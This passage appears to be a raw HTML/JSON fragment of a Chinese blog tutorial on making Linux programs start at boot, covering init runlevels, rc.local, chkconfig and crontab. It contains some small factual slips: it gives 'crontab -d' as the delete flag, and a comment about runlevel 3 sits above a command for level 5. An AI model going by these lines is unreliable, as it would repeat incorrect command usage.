class=\"comment\">#&#x67E5;&#x770B;&#x54EA;&#x4E9B;&#x7A0B;&#x5E8F;&#x88AB;&#x6DFB;&#x52A0;&#x4E3A;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x5373;&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x54EA;&#x4E9B;&#x7A0B;&#x5E8F;&#x8DEF;&#x5F84;</span></span><br><span class=\"line\">cat /etc/rc.local</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x4E09;&#x3001;crontab\"><a href=\"#&#x4E09;&#x3001;crontab\" class=\"headerlink\" title=\"&#x4E09;&#x3001;crontab\"></a>&#x4E09;&#x3001;crontab</h3><p>&#x901A;&#x8FC7;crontab&#x53EF;&#x4EE5;&#x8BBE;&#x5B9A;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8868;&#xFF0C;&#x4F8B;&#x5982;&#x8BA9;&#x7A0B;&#x5E8F;&#x5728;&#x6BCF;&#x5929;&#x7684;8&#x70B9;&#xFF0C;&#x6216;&#x8005;&#x6BCF;&#x4E2A;&#x661F;&#x671F;&#x4E00;&#x7684;10&#x70B9;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;<br>crontab -l &#x5217;&#x51FA;&#x65F6;&#x95F4;&#x8868;&#xFF1B;<br>crontab -e&#x7F16;&#x8F91;&#x65F6;&#x95F4;&#x8868;&#xFF1B;<br>crontab -d&#x5220;&#x9664;&#x65F6;&#x95F4;&#x8868;&#xFF1B;</p>\n<p>&#x201C;-l&#x201D;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x67E5;&#x770B;&#x800C;&#x5DF2;&#xFF1B;<br>&#x201C;-e&#x201D;&#x662F;&#x7F16;&#x8F91;&#xFF0C;&#x548C;vi&#x6CA1;&#x4EC0;&#x4E48;&#x5DEE;&#x522B;&#xFF08;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x7528;vi&#x7F16;&#x8F91;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x6587;&#x4EF6;&#xFF09;&#xFF1B;<br>&#x201C;-d&#x201D;&#x57FA;&#x672C;&#x4E0D;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x628A;&#x8BE5;&#x7528;&#x6237;&#x6240;&#x6709;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x90FD;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x7528;&#x201C;-e&#x201D;&#x7F16;&#x8F91;&#x628A;&#x4E0D;&#x8981;&#x4E86;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x9010;&#x884C;&#x5220;&#x9664;&#xFF1B;</p>\n<p>&#x90A3;&#x5230;&#x5E95;&#x8BE5;&#x5982;&#x4F55;&#x7F16;&#x8F91;&#x5462;&#xFF1F;</p>\n<p>crontab&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#x662F;&#xFF1A;M H D m d CMD&#x3002;<br>&#x4E00;&#x4E2A;6&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x5176;&#x4E2D;&#x6700;&#x540E;&#x4E00;&#x4E2A;CMD&#x5C31;&#x662F;&#x6240;&#x8981;&#x6267;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x5982;haha.sh&#x3002;<br>M&#xFF1A;&#x5206;&#x949F;&#xFF08;0-59&#xFF09;<br>H&#xFF1A;&#x5C0F;&#x65F6;&#xFF08;0-23&#xFF09;<br>D&#xFF1A;&#x65E5;&#x671F;&#xFF08;1-31&#xFF09;<br>m&#xFF1A;&#x6708;&#x4EFD;&#xFF08;1-12&#xFF09;<br>d&#xFF1A;&#x4E00;&#x4E2A;&#x661F;&#x671F;&#x4E2D;&#x7684;&#x67D0;&#x5929;&#xFF08;0-6&#xFF0C;0&#x4EE3;&#x8868;&#x5468;&#x65E5;&#xFF09;</p>\n<p>&#x8FD9;5&#x4E2A;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;&#xFF0C;&#x5176;&#x503C;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#x7684;&#x591A;&#x4E2A;&#x6570;&#x5B57;&#xFF08;&#x6216;&#x5176;&#x4ED6;&#xFF09; &#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x9700;&#x8BBE;&#x7F6E;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;&#x201C;*&#x201D;&#x3002;</p>\n<p>&#x4F8B;&#x5982;&#xFF0C;&#x6BCF;&#x5929;&#x7684;8&#x70B9;5&#x5206;&#x6267;&#x884C;haha.sh&#xFF0C;&#x5C31;&#x662F;&#x201C;5 8 <em> </em> * /opt/./haha.sh&#x201D;&#x3002;</p>\n<p>&#x597D;&#x50CF;&#x548C;&#x201C;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x201D;&#x626F;&#x8FDC;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x56DE;&#x5F52;&#x6B63;&#x9898;&#x3002;<br><strong>&#x5176;&#x5B9E;&#x4E0A;&#x9762;&#x4ECB;&#x7ECD;&#x7684;crontab&#x7684;&#x529F;&#x80FD;&#x5DF2;&#x7ECF;&#x5177;&#x5907;&#x4E86;&#x5F00;&#x673A;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x53EF;&#x4EE5;&#x5199;&#x4E00;&#x4E2A;&#x76D1;&#x6D4B;&#x811A;&#x672C;&#xFF0C;&#x6BCF;5&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF08;<em>/5 </em> <em> </em> * ./haha.sh&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x4E0D;&#x5728;&#x4E86;&#x5C31;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x4E00;&#x6B21;&#x3002;</strong></p>\n","excerpt":"<h3 id=\"init&#x8FDB;&#x7A0B;\"><a href=\"#init&#x8FDB;&#x7A0B;\" class=\"headerlink\" title=\"init&#x8FDB;&#x7A0B;\"></a>init&#x8FDB;&#x7A0B;</h3><p>init&#x8FDB;&#x7A0B;&#x662F;&#x975E;&#x5185;&#x6838;&#x8FDB;&#x7A0B;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x88AB;&#x542F;&#x52A8;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x8FDB;&#x7A0B;&#x7F16;&#x53F7;PID&#x7684;&#x503C;&#x603B;&#x662F;1&#x3002;init&#x8BFB;&#x5B83;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/inittab&#xFF0C;&#x51B3;&#x5B9A;&#x9700;&#x8981;&#x542F;&#x52A8;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;(Runlevel)&#x3002;&#x4ECE;&#x6839;&#x672C;&#x4E0A;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x89C4;&#x5B9A;&#x4E86;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x6BCF;&#x4E2A;&#x7EA7;&#x522B;(&#x5206;&#x522B;&#x7531;0&#x5230;6&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;)&#x6EE1;&#x8DB3;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x7684;&#x3002;&#x5982;&#x679C;&#x5B9A;&#x4E49;&#x4E86;initdefault&#x7EA7;&#x522B;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5C31;&#x76F4;&#x63A5;&#x88AB;&#x9009;&#x4E2D;&#xFF0C;&#x5426;&#x5219;&#x9700;&#x8981;&#x7531;&#x7528;&#x6237;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x503C;&#x3002;<br>&#x8F93;&#x5165;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x4E4B;&#x540E;&#xFF0C;init&#x6839;&#x636E;/etc/inittab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5B9A;&#x4E49;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D6;&#x51B3;&#x4E8E;&#x5B89;&#x88C5;&#x9636;&#x6BB5;&#x5BF9;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x7684;&#x9009;&#x62E9;&#xFF1A;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6587;&#x672C;&#x7684;&#xFF0C;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;X-Window&#x7684;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x3002;<br>rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#xFF0C;&#x5F53;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x5C06;&#x7531;/etc/inittab&#x6587;&#x4EF6;&#x5B9A;&#x4E49;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x54EA;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x8D1F;&#x8D23;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x8BE5;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7279;&#x5B9A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x3002;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x662F;/etc/rc.d/rc&#xFF0C;&#x5B83;&#x8D1F;&#x8D23;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6309;&#x7167;&#x6B63;&#x786E;&#x7684;&#x987A;&#x5E8F;&#x8C03;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5F88;&#x5BB9;&#x6613;&#x53D8;&#x5F97;&#x96BE;&#x4EE5;&#x63A7;&#x5236;&#xFF01;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x7C7B;&#x4E8B;&#x4EF6;&#x7684;&#x53D1;&#x751F;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x65B9;&#x6848;&#x3002;</p>","more":"<p>&#x5BF9;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6765;&#x8BF4;&#xFF0C;&#x5728;/etc/rc.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;&#x4E0B;&#x7EA7;&#x76EE;&#x5F55;&#x3002;&#x8FD9;&#x4E9B;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x4E0B;&#x7EA7;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x547D;&#x540D;&#x65B9;&#x6CD5;&#x662F;rcX.d&#xFF0C;&#x5176;&#x4E2D;&#x7684;X&#x5C31;&#x662F;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;3&#x7684;&#x5168;&#x90E8;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x90FD;&#x4FDD;&#x5B58;&#x5728;/etc/rc.d/rc3.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x3002;&#x5728;&#x5404;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x90FD;&#x5EFA;&#x7ACB;&#x6709;&#x5230;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x5E76;&#x4E0D;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5728;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x539F;&#x6765;&#x7684;&#x540D;&#x5B57;&#x3002;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x6765;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x5176;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#xFF1B;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x6765;&#x5173;&#x95ED;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x5176;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x3002;<br>&#x8BB8;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x90FD;&#x5F88;&#x91CD;&#x8981;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5148;&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF0C;&#x5C31;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x4F7F;&#x7528;DNS&#x670D;&#x52A1;&#x89E3;&#x6790;&#x4E3B;&#x673A;&#x540D;&#xFF01;&#x4E3A;&#x4E86;&#x5B89;&#x6392;&#x5B83;&#x4EEC;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#xFF0C;&#x5728;&#x5B57;&#x6BCD;S&#x6216;&#x8005;K&#x7684;&#x540E;&#x9762;&#x7D27;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x4E24;&#x4F4D;&#x6570;&#x5B57;&#xFF0C;&#x6570;&#x503C;&#x5C0F;&#x7684;&#x5728;&#x6570;&#x503C;&#x5927;&#x7684;&#x524D;&#x9762;&#x6267;&#x884C;&#x3002;&#x6BD4;&#x5982;&#xFF1A;/etc/rc.d/rc3.d/S50inet&#x5C31;&#x4F1A;&#x5728;/etc/rc.d/rc3.d/S55named&#x4E4B;&#x524D;&#x6267;&#x884C;(S50inet&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x8BBE;&#x7F6E;&#xFF0C;55named&#x542F;&#x52A8;DNS&#x670D;&#x52A1;&#x5668;)&#x3002;&#x5B58;&#x653E;&#x5728;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x3001;&#x88AB;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x4E0A;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x771F;&#x6B63;&#x7684;&#x5B9E;&#x5E72;&#x5BB6;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x5B8C;&#x6210;&#x4E86;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x7684;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x3002;&#x5F53;/etc/rc.d/rc&#x8FD0;&#x884C;&#x901A;&#x8FC7;&#x6BCF;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x6839;&#x636E;&#x6570;&#x5B57;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8C03;&#x7528;&#x5404;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x3002;&#x5B83;&#x5148;&#x8FD0;&#x884C;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD0;&#x884C;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5BF9;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x4F20;&#x9012;Stop&#x53C2;&#x6570;&#xFF1B;&#x7C7B;&#x4F3C;&#x5730;&#x5BF9;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x4F20;&#x9012;Start&#x53C2;&#x6570;&#x3002;&#x7F16;&#x5199;&#x81EA;&#x5DF1;&#x7684;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x5728;&#x7EF4;&#x62A4;Linux&#x7CFB;&#x7EDF;&#x8FD0;&#x8F6C;&#x7684;&#x65E5;&#x5B50;&#x91CC;&#xFF0C;&#x80AF;&#x5B9A;&#x4F1A;&#x9047;&#x5230;&#x9700;&#x8981;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5BF9;&#x5F00;&#x673A;&#x6216;&#x8005;&#x5173;&#x673A;&#x547D;&#x4EE4;&#x811A;<br>&#x672C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x7684;&#x60C5;&#x51B5;&#x3002;</p>\n<h3 id=\"&#x4E00;&#x3001;-etc-rc-d-rc-local\"><a href=\"#&#x4E00;&#x3001;-etc-rc-d-rc-local\" class=\"headerlink\" title=\"&#x4E00;&#x3001;/etc/rc.d/rc.local\"></a>&#x4E00;&#x3001;/etc/rc.d/rc.local</h3><p>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7F16;&#x8F91;&#x201C;/etc/rc.d/rc.local(&#x94FE;&#x63A5;&#x5730;&#x5740;&#x4E3A;/etc/rc.local)&#x201D;&#xFF0C;&#x628A;&#x542F;&#x52A8;&#x7A0B;&#x5E8F;&#x7684;shell&#x547D;&#x4EE4;&#x8F93;&#x5165;&#x8FDB;&#x53BB;&#x5373;&#x53EF;&#xFF0C;&#x8F93;&#x5165;&#x547D;&#x4EE4;&#x7684;&#x5168;&#x8DEF;&#x5F84;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;windows&#x4E0B;&#x7684;&#x201C;&#x542F;&#x52A8;&#x201D;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x5728;centos7&#x4E2D;,/etc/rc.d/rc.local&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x88AB;&#x964D;&#x4F4E;&#x4E86;,&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x81EA;&#x5DF1;&#x7684;&#x811A;&#x672C;&#x662F;&#x4E0D;&#x80FD;&#x8D77;&#x52A8;&#x4E00;&#x4E9B;&#x670D;&#x52A1;&#x7684;,&#x6267;&#x884C;&#x4E0B;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x6587;&#x4EF6;&#x6807;&#x8BB0;&#x4E3A;&#x53EF;&#x6267;&#x884C;&#x7684;&#x6587;&#x4EF6;</span></span><br><span class=\"line\">chmod +x /etc/rc.d/rc.local</span><br><span class=\"line\"></span><br><span class=\"line\">vim /etc/rc.d/rc.local</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6587;&#x4EF6;&#x6700;&#x540E;&#x6DFB;&#x52A0;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;</span></span><br><span class=\"line\">/data/run/script/start-service.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x5728;&#x811A;&#x672C;&#x4E2D;&#x8F93;&#x5165;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x5982;&#x5F00;&#x673A;&#x542F;&#x52A8;tomcat</span></span><br><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> JDK_HOME=/home/java/jdk1.8.0_91</span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/home/java/jdk1.8.0_91</span><br><span class=\"line\">/home/tomcat/apache-tomcat-8.0.36/bin/startup.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x8D4B;&#x4E88;&#x6267;&#x884C;&#x6743;&#x9650;</span></span><br><span class=\"line\">chmod +x /data/run/script/start-service.sh</span><br></pre></td></tr></table></figure>\n<p>&#x8FD9;&#x6837;&#xFF0C;start-service.sh&#x811A;&#x672C;&#x5728;&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x4E86;,&#x4EE5;&#x540E;&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6DFB;&#x52A0;&#x5728;&#x8BE5;&#x811A;&#x672C;&#x4E2D;&#x3002;</p>\n<h3 id=\"&#x4E8C;&#x3001;chkconfig\"><a href=\"#&#x4E8C;&#x3001;chkconfig\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;chkconfig\"></a>&#x4E8C;&#x3001;chkconfig</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x67E5;&#x770B;nginx&#x670D;&#x52A1;&#x542F;&#x52A8;&#x9009;&#x9879;&#x7684;&#x914D;&#x7F6E;&#x72B6;&#x6001;</span></span><br><span class=\"line\">chkconfig --list | grep nginx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0 - &#x505C;&#x673A;</span></span><br><span class=\"line\"><span class=\"comment\"># 1 - &#x5355;&#x7528;&#x6237;&#x6A21;&#x5F0F; </span></span><br><span class=\"line\"><span class=\"comment\"># 2 - &#x591A;&#x7528;&#x6237;&#xFF0C;&#x6CA1;&#x6709;NFS </span></span><br><span class=\"line\"><span class=\"comment\"># 3 - &#x5B8C;&#x5168;&#x591A;&#x7528;&#x6237;&#x6A21;&#x5F0F;(&#x6807;&#x51C6;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x6A21;&#x5F0F;&#x542F;&#x52A8;) </span></span><br><span class=\"line\"><span class=\"comment\"># 4 - &#x6CA1;&#x6709;&#x7528;&#x5230; </span></span><br><span class=\"line\"><span class=\"comment\"># 5 - X11(xwindow&#xFF0C;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x542F;&#x52A8;) </span></span><br><span class=\"line\"><span class=\"comment\"># 6 - &#x91CD;&#x65B0;&#x542F;&#x52A8; </span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6700;&#x5E38;&#x7528;&#x7684;&#x8BBE;&#x7F6E;&#x4E3A;2,3,5</span></span><br><span class=\"line\">nginx   0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:off</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x6DFB;&#x52A0;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;</span></span><br><span class=\"line\">chkconfig --add nginx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x5220;&#x9664;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;</span></span><br><span class=\"line\">chkconfig --del nginx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x8BA9;mysql&#x670D;&#x52A1;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x6A21;&#x5F0F;&#xFF0C;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;</span></span><br><span class=\"line\">chkconfig --level 3 mysql on</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x53D6;&#x6D88;mysql service&#x5728;runlevel3&#x7684;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x8BBE;&#x7F6E;</span></span><br><span class=\"line\">chkconfig --level 5 mysql off</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x67E5;&#x770B;&#x54EA;&#x4E9B;&#x7A0B;&#x5E8F;&#x88AB;&#x6DFB;&#x52A0;&#x4E3A;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x5373;&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x54EA;&#x4E9B;&#x7A0B;&#x5E8F;&#x8DEF;&#x5F84;</span></span><br><span class=\"line\">cat /etc/rc.local</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x4E09;&#x3001;crontab\"><a href=\"#&#x4E09;&#x3001;crontab\" class=\"headerlink\" 